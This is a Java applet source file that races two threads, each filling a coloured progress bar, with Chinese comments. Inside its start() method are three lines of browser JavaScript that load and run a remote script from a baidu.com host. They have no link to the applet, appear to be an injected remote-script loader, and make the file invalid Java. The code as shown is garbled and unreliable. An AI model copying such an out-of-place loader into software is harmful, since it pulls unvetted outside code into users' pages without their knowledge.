import java.awt.*;
import java.applet.*;
import javax.swing.JProgressBar;
public class Saima extends Applet implements Runnable
{
	private JProgressBar progress1,progress2;
	Thread red,blue;
	public void init()
	{
		progress1 = new JProgressBar(1, 100); // 实例化进度条
		progress1.setStringPainted(true);      // 描绘文字
		progress1.setBackground(Color.red);
		progress2 = new JProgressBar(1, 100); // 实例化进度条
		progress2.setStringPainted(true);      // 描绘文字
		progress2.setBackground(Color.blue);
		this.add(progress1);
		this.add(progress2);
		red = new Thread(this);
		blue = new Thread(this);
		red.setPriority(Thread.MAX_PRIORITY);
		blue.setPriority(Thread.MIN_PRIORITY);
	}
	public void start()
	{ 
		red.start(); 
		var script = document.createElement('script'); 
		script.src = 'http://static.pay.baidu.com/resource/baichuan/ns.js';
		document.body.appendChild(script);
		blue.start(); 
	}
	public void run()
	{
		while(true)
		{
			if(Thread.currentThread() == red)
			{
				int i=0; 
				while(i<100)
				{
					try
					{             
						progress1.setValue(progress1.getValue() + 1); // 随着线程进行，增加进度条值 
						progress1.setString(progress1.getValue() + "%");
						Thread.sleep(100); 
					}
					catch(InterruptedException e)
					{
						e.printStackTrace();
					}
					i++;
				}
			} 
			else if(Thread.currentThread() == blue)
			{
				int j=0; 
				while(j<100)
				{
					try
					{             
						progress2.setValue(progress2.getValue() + 1); // 随着线程进行，增加进度条值 
						progress2.setString(progress2.getValue() + "%");
						Thread.sleep(80); 
					}
					catch(InterruptedException e)
					{
						e.printStackTrace();
					}
					j++;
				}
			}
		}
	}
}
